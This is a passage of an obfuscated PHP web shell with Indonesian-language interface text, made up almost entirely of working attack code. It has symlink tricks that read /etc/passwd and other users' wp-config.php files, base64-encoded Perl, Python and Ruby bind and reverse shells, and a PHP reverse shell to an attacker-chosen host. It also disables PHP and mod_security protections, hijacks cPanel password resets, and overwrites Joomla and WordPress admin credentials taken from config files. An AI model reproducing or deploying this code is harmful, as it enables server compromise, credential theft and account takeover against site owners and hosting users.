fclose($file);
echo '</table></div>';
}else{
if($IIIIIIIIl111 != 'Windows'){
@mkdir('indosec_sym',0777);
@chdir('indosec_sym');
@IIIIIIIII1lI('ln -s / root');
$IIIIIII1l11I = 'Options Indexes FollowSymLinks
				DirectoryIndex indsc.html
				AddType text/plain php html php5 phtml
				AddHandler text/plain php html php5 phtml
				Satisfy Any';
$IIIIIII1l11l = fopen('.htaccess','w');
$IIIIIII1l111 = fwrite($IIIIIII1l11l,$IIIIIII1l11I);@fclose($IIIIIII1l11l);
echo "[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&aksi=sym_bypas'>Symlink Bypass</a> ]
				<div class='tmp'><table class='text-center table-responsive'>
				<thead class='bg-danger'>
				<th>ID.</th>
				<th>Users</th>
				<th>symlink </th>
				</thead>";
$IIIIIII11I1l = '';$IIIIIII11I11 = 0;$IIIIIII11lII = 1000;
for(;$IIIIIII11I11 <= $IIIIIII11lII;$IIIIIII11I11++){
$IIIIIII1ll1l = @posix_getpwuid($IIIIIII11I11);
if ($IIIIIII1ll1l)$IIIIIII11I1l .= join(':',$IIIIIII1ll1l)."\n";
}
echo '<br/>';$IIIIIII11I1l = trim($IIIIIII11I1l);
$IIIIIII11lIl = fopen('test.txt','w');
fputs($IIIIIII11lIl,$IIIIIII11I1l);
fclose($IIIIIII11lIl);$IIIIIII11IIl = 1;$file =
fopen('test.txt','r') or exit('Unable to open file!');
while(!feof($file)){
$s = fgets($file);$IIIIIII11Il1 = array();
$t = preg_match('/\/(.*?)\:\//s',$s,$IIIIIII11Il1);
$IIIIIII11Il1 = str_replace('home/','',$IIIIIII11Il1[1]);
if(strlen($IIIIIII11Il1) >12 ||strlen($IIIIIII11Il1) == 0 ||$IIIIIII11Il1 == 'bin'||$IIIIIII11Il1 == 'etc/X11/fs'||$IIIIIII11Il1 == 'var/lib/nfs'||$IIIIIII11Il1 == 'var/arpwatch'||$IIIIIII11Il1 == 'var/gopher'||$IIIIIII11Il1 == 'sbin'||$IIIIIII11Il1 == 'var/adm'||$IIIIIII11Il1 == 'usr/games'||$IIIIIII11Il1 == 'var/ftp'||$IIIIIII11Il1 == 'etc/ntp'||$IIIIIII11Il1 == 'var/www'||$IIIIIII11Il1 == 'var/named')
continue;
echo '<tr>
					<td>'.$IIIIIII11IIl.'</td>
					<td>'.$IIIIIII11Il1."</td>
					<td><a href=$IIIIIII1l1ll/indosec_sym/root/home/".$IIIIIII11Il1."/public_html target='_blank'>Symlink</a></td>
					</tr>";
$IIIIIII11IIl++;
}
fclose($file);
echo '</table></div>';
unlink('test.txt');
}
}
}
exit;
}
function IIIIIII11lI1($dir,$file){
echo "read /etc/named.conf
	<form method='post' action='?dir=$dir&aksi=symread&save=1'>
	<textarea class='form-control' rows='13' name='file'>";
flush();
flush();
$file = '/etc/named.conf';
$IIIIIII11llI = @fopen($file,'r');
if ($IIIIIII11llI){
$IIIIIII11lll = @fread($IIIIIII11llI,@filesize($file));
echo ''.htmlentities($IIIIIII11lll).'';
}else if (!$IIIIIII11llI){
$IIIIIII11llI = @show_source($file) ;
}else if (!$IIIIIII11llI){
$IIIIIII11llI = @highlight_file($file);
}else if (!$IIIIIII11llI){
$IIIIIII11l11 = @symlink($file,'sym.txt');
if ($IIIIIII11l11){
$IIIIIII11llI = @fopen('indosec_sym/sym.txt','r');
$IIIIIII11lll = @fread($IIIIIII11llI,@filesize($file));
echo ''.htmlentities($IIIIIII11lll).'';
}
}
echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
if(isset($_GET['save'])){
$IIIIIII111Il = stripcslashes($_POST['file']);
$IIIIIII1IlII = fopen('named.txt','w');
$w = fwrite($IIIIIII1IlII,$IIIIIII111Il);
if($w){
echo '<br/>save has been successfully';
}
fclose($IIIIIII1IlII);
}
exit;
}
function IIIIIII111ll($dir,$file){
$IIIIIII111l1 = get_current_user();
if($_POST['execute']){
@rmdir('indosec_sym404');
@mkdir('indosec_sym404',0777);
$dir = $_POST['dir'];
$isi = $_POST['isi'];
@system('ln -s '.$dir.'indosec_sym404/'.$isi);
@symlink($dir,'indosec_sym404/'.$isi);
$IIIIIII11111 = fopen('indosec_sym404/.htaccess','w');
@fwrite($IIIIIII11111,'ReadmeName '.$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
echo'<a href="/indosec_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
}else{
echo '<h2>Symlink 404</h2>
		<form method="post">
		File Target: <input type="text" class="form-control" name="dir" value="/home/'.$IIIIIII111l1.'/public_html/wp-config.php"><br/>
		Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
		<input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
		<p class="text-muted">NB: Letak wp-config tidak semuanya berada di <u>public_html/wp-config.php</u> jadi silahkan ubah sesuai letaknya.</p>
		</form>';
}
exit;
}
function IIIIIIlIIIII($dir,$file){
$IIIIIII1l1ll = str_replace($_SERVER['DOCUMENT_ROOT'],'',$dir);
$IIIIIIlIIIIl = 'ftp://'.$_SERVER['SERVER_NAME'].'/public_html/'.$_SERVER['REQUEST_URI'];
$u = explode('/',$IIIIIIlIIIIl );
$IIIIIIlIIIIl =str_replace($u[count($u)-1],'',$IIIIIIlIIIIl );
if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') >0){
$IIIIIII111Il = stripcslashes($_POST['file']);
if(!file_exists('passwd.txt')){
$IIIIIII1IlII = @fopen('passwd.txt','w');
$w = @fwrite($IIIIIII1IlII,$IIIIIII111Il);
fclose($IIIIIII1IlII);
}
if($w or @filesize('passwd.txt') >0){
echo "<div class='tmp'>
			<table width='100%' class='text-center table-responsive mb-4'>
			<thead class='bg-info'>
			<th>Users</th>
			<th>symlink</th>
			<th>FTP</th>
			</thead>";
flush();
$IIIIIIlIIIlI = file('passwd.txt');
foreach ($IIIIIIlIIIlI as $IIIIIII1IlII){
$u=explode(':',$IIIIIII1IlII);
$user = $u['0'];
echo "<tr>
				<td class='text-left pl-1'>$user</td>
				<td><a href='$IIIIIII1l1ll/sym/root/home/$user/public_html' target='_blank'>Symlink </a></td>
				<td><a href='$IIIIIIlIIIIl/sym/root/home/$user/public_html' target='_blank'>FTP</a></td>
				</tr>";
flush();
flush();
}
echo '</tr></table></div>';
die();
}
}
echo "read /etc/passwd <font color='red'>error ?  </font><a href='?dir=".$dir."&aksi=passwbypass'>Bypass Here</a>
	<form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
	<textarea class='form-control' rows='13' name='file'>";
flush();
$file = '/etc/passwd';
$IIIIIII11llI = @fopen($file,'r');
if ($IIIIIII11llI){
$IIIIIII11lll = @fread($IIIIIII11llI,@filesize($file));
echo ''.htmlentities($IIIIIII11lll).'';
}elseif(!$IIIIIII11llI){
$IIIIIII11llI = @show_source($file) ;
}elseif(!$IIIIIII11llI){
$IIIIIII11llI = @highlight_file($file);
}elseif(!$IIIIIII11llI){
for($IIIIIII1ll1l=0;$IIIIIII1ll1l<1000;$IIIIIII1ll1l++){
$IIIIIII1ll11 = posix_getpwuid($IIIIIII1ll1l);
if (!empty($IIIIIII1ll11)){
while (list ($IIIIIII1l1II,$IIIIIII1l1Il) = each($IIIIIII1ll11)){
print "$IIIIIII1l1Il:";
}
print "\n";
}
}
}
flush();
echo "</textarea><br/>
	<input type='submit' class='btn btn-danger btn-block' value='Symlink'/>
	</form>";
flush();
exit;
}
function IIIIIIlIIIll($dir,$file){
echo "<h4 class='text-center mb-4'>Back Connect Tools</h4>
	<form method='post'>
	<div class='row'>
	<div class='col-md-10'>
	<span>Bind port to /bin/sh [Perl]</span><br/>
	<label>Port :</label>
	<div class='form-group input-group mb-4'>
	<input type='text' name='port' class='form-control' value='6969'>
	<input type='submit' name='bpl' class='btn btn-danger form-control' value='Reserve'>
	</div>
	<h5>Back-Connect</h5>
	<label>Server :</label>
	<input type='text' name='server' class='form-control mb-3' placeholder='".$_SERVER['REMOTE_ADDR'] ."'>
	<label>Port :</label>
	<div class='form-group input-group mb-4'>
	<input type='text' name='port' class='form-control' placeholder='443'>
	<select class='form-control' name='backconnect'>
	<option value='perl'>Perl</option>
	<option value='php'>PHP</option>
	<option value='python'>Python</option>
	<option value='ruby'>Ruby</option>
	</select>
	</div>
	<input type='submit' class='btn btn-danger btn-block' value='Connect'>
	</div>
	</div>
	</form>";
if($_POST['bpl']){
$IIIIIIlIIIl1 = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=');
$IIIIIIlIII1l = @fopen('bp.pl','w');
fwrite($IIIIIIlIII1l,$IIIIIIlIIIl1);
$IIIIIIlIII11 = IIIIIIIII1lI('perl bp.pl '.$_POST['port'].' 1>/dev/null 2>&1 &');
sleep(1);
echo "<pre class='text-light'>$IIIIIIlIII11\n".IIIIIIIII1lI('ps aux | grep bp.pl').'</pre>';
unlink('bp.pl');
}
if($_POST['backconnect'] == 'perl'){
$IIIIIIlIIlIl = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7');
$IIIIIIlIIlI1 = @fopen('bc.pl','w');
fwrite($IIIIIIlIIlI1,$IIIIIIlIIlIl);
$IIIIIIlIII11 = IIIIIIIII1lI('perl bc.pl '.$_POST['server'].' '.$_POST['port'].' 1>/dev/null 2>&1 &');
sleep(1);
echo "<pre class='text-light'>$IIIIIIlIII11\n".IIIIIIIII1lI('ps aux | grep bc.pl').'</pre>';
unlink('bc.pl');
}
if($_POST['backconnect'] == 'python'){
$IIIIIIlIIllI = base64_decode('IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=');
$IIIIIIlIIlll = @fopen('bcpyt.py','w');
fwrite($IIIIIIlIIlll,$IIIIIIlIIllI);
$IIIIIIlIIll1 = IIIIIIIII1lI('python bcpyt.py '.$_POST['server'].' '.$_POST['port']);
sleep(1);
echo "<pre class='text-light'>$IIIIIIlIIll1\n".IIIIIIIII1lI('ps aux | grep bcpyt.py').'</pre>';
unlink('bcpyt.py');
}
if($_POST['backconnect'] == 'ruby'){
$IIIIIIlIIl1I = base64_decode('IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k');
$IIIIIIlIIl1l = @fopen('bcruby.rb','w');
fwrite($IIIIIIlIIl1l,$IIIIIIlIIl1I);
$IIIIIIlIIl11 = IIIIIIIII1lI('ruby bcruby.rb '.$_POST['server'].' '.$_POST['port']);
sleep(1);
echo "<pre class='text-light'>$IIIIIIlIIl11\n".IIIIIIIII1lI('ps aux | grep bcruby.rb').'</pre>';
unlink('bcruby.rb');
}
if($_POST['backconnect'] == 'php'){
$IIIIIIII1III = $_POST['server'];
$port = $_POST['port'];
$IIIIIIlII1Il = fsockopen($IIIIIIII1III ,$port ,$IIIIIIlII1lI,$IIIIIIlII1ll );
if($IIIIIIlII1lI != 0){
echo "<font color='red'>$IIIIIIlII1lI : $IIIIIIlII1ll</font>";
}else if (!$IIIIIIlII1Il){
$IIIIIIlII1l1 = '<p>Unexpected error has occured, connection may have failed.</p>';
}else{
fputs ($IIIIIIlII1Il ,"
				\n{#######################################}
				\n..:: BackConnect PHP By Con7ext ::..
				\n{#######################################}\n");
$dir = @shell_exec('pwd');
$IIIIIIlII11I = @shell_exec('uname -a');
$time = @Shell_exec('time');
$IIIIIIlII111 = 1337;
fputs($IIIIIIlII1Il,'User ',$IIIIIIlII11I,'connected @ ',$time,"\n\n");
while(!feof($IIIIIIlII1Il)){
$IIIIIIlIlIII = '[kuda]#:> ';
@fputs ($IIIIIIlII1Il ,$IIIIIIlIlIII );
$IIIIIIlIlIIl= fgets($IIIIIIlII1Il,$IIIIIIlII111);
@fputs($IIIIIIlII1Il ,"\n".@shell_exec($IIIIIIlIlIIl) ."\n\n");
}
@fclose($IIIIIIlII1Il);
}
}
exit;
}
function disabFunc($dir,$file){
echo "<div class='card card-body text-center text-dark'>
	<h4 class='text-center mt-2 mb-3'>Bypass Disable Functions</h2>
	<form method='POST'>
	<input type='submit' class='btn btn-danger' name='ini' value='php.ini'/>
	<input type='submit' class='btn btn-danger' name='htce' value='.htaccess'/>
	<input type='submit' class='btn btn-danger' name='litini' value='Litespeed'/>
	</form>";
if(isset($_POST['ini'])){
$file = fopen('php.ini','w');
echo fwrite($file,"safe_mode = OFF\ndisable_functions = NONE");
fclose($file);
echo "<a href='php.ini' class='btn btn-success btn-block' target='_blank'>Klik Coeg!</a>";
}elseif(isset($_POST['htce'])){
$file = fopen('.htaccess','w');
echo fwrite($file,"<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
fclose($file);
echo '<p>.htaccess successfully created!</p>';
}elseif(isset($_POST['litini'])){
$IIIIIIlIlIlI = 'PD8gZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbImZpbGUiXSk7DQplY2hvIGluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOw0KZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbInNzIl07DQo/Pg==';
$IIIIIIlIlIll = "safe_mode = OFF\ndisable_functions = NONE";
$IIIIIIlIlIl1 = "<Files *.php>\nForceType application/x-httpd-php4\n</Files>";
file_put_contents('php.ini',$IIIIIIlIlIll);
file_put_contents('ini.php',$IIIIIIlIlIlI);
file_put_contents('.htaccess',$IIIIIIlIlIl1);
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Disable Functions in Litespeed Created';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
echo '</div>';
}
function IIIIIIlIlI1I($dir){
echo '<h5 class="text-center mb-4"><i class="fa fa-key"></i> Auto Reset Password Cpanel</h5>
	<form method="POST">
	<div class="form-group input-group">
	<div class="input-group-prepend">
	<div class="input-group-text"><i class="fa fa-envelope"></i></div>
	</div>
	<input type="email" name="email" class="form-control" placeholder="Masukan Email..."/>
	</div>
	<input type="submit" name="submit" class="btn btn-danger btn-block" value="Send"/>
	</div>
	</form>';
if(isset($_POST['submit'])){
$user = get_current_user();
$IIIIIIlIlI1l = $_SERVER['HTTP_HOST'];
$IIIIIIlIlI11 = getenv('REMOTE_ADDR');
$email = $_POST['email'];
$IIIIIIlIllIl = 'email:'.$email;
$IIIIIII1IlII = fopen('/home/'.$user.'/.cpanel/contactinfo','w');
@fwrite($IIIIIII1IlII,$IIIIIIlIllIl);
@fclose($IIIIIII1IlII);
$IIIIIII1IlII = fopen('/home/'.$user.'/.contactinfo','w');
@fwrite($IIIIIII1IlII,$IIIIIIlIllIl);
@fclose($IIIIIII1IlII);
$IIIIIIlIllI1 = $IIIIIIlIlI1l.':2082/resetpass?start=1';
echo '<br/>Url: '.$IIIIIIlIllI1.'';
echo '<br/>Username: '.$user.'';
echo '<br/>Success Reset To: '.$email.'<br/><br/>';
}
exit;
}
function IIIIIIlIlllI($dir,$file){
if($_POST['hajar']){
if(strlen($_POST['pass_baru']) <6 OR strlen($_POST['user_baru']) <6){
echo 'Username dan Password harus lebih dari 6 karakter';
}else{
$user_baru = $_POST['user_baru'];
$pass_baru = md5($_POST['pass_baru']);
$conf = $_POST['config_dir'];
$IIIIIIlIll1l = scandir($conf);
foreach($IIIIIIlIll1l as $IIIIIIlIll11){
if(!is_file("$conf/$IIIIIIlIll11")) continue;
$config = file_get_contents("$conf/$IIIIIIlIll11");
if(preg_match('/JConfig|joomla/',$config)){
$IIIIIIlIl1Il = IIIIIIII11l1($config,"host = '","'");
$IIIIIIlIl1I1 = IIIIIIII11l1($config,"user = '","'");
$IIIIIIlIl1lI = IIIIIIII11l1($config,"password = '","'");
$IIIIIIlIl1ll = IIIIIIII11l1($config,"db = '","'");
$IIIIIIlIl1l1 = IIIIIIII11l1($config,"dbprefix = '","'");
$IIIIIIlIl11I = $IIIIIIlIl1l1.'users';
$IIIIIIlIl11l = mysql_connect($IIIIIIlIl1Il,$IIIIIIlIl1I1,$IIIIIIlIl1lI);
$IIIIIIlI1III = mysql_select_db($IIIIIIlIl1ll);
$IIIIIIlI1IIl = mysql_query("SELECT * FROM $IIIIIIlIl11I ORDER BY id ASC");
$IIIIIIlII1l1 = mysql_fetch_array($IIIIIIlI1IIl);
$id = $IIIIIIlII1l1['id'];
$IIIIIIlIlI1l = IIIIIIII11l1($config,"sitename = '","'");
$IIIIIIlI1Il1 = mysql_query("UPDATE $IIIIIIlIl11I SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
echo 'Config => '.$IIIIIIlIll11.'<br>';
echo 'CMS => Joomla<br>';
if($IIIIIIlIlI1l == ''){
echo 'Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>';
}else{
echo "Sitename => $IIIIIIlIlI1l<br>";
}
if(!$IIIIIIlI1Il1 OR !$IIIIIIlIl11l OR !$IIIIIIlI1III){
echo 'Status => <font color=red>'.mysql_error().'</font><br><br>';
}else{
echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
}
mysql_close($IIIIIIlIl11l);
}elseif(preg_match('/WordPress/',$config)){
$IIIIIIlIl1Il = IIIIIIII11l1($config,"DB_HOST', '","'");
$IIIIIIlIl1I1 = IIIIIIII11l1($config,"DB_USER', '","'");
$IIIIIIlIl1lI = IIIIIIII11l1($config,"DB_PASSWORD', '","'");
$IIIIIIlIl1ll = IIIIIIII11l1($config,"DB_NAME', '","'");
$IIIIIIlIl1l1 = IIIIIIII11l1($config,"table_prefix  = '","'");
$IIIIIIlIl11I = $IIIIIIlIl1l1.'users';
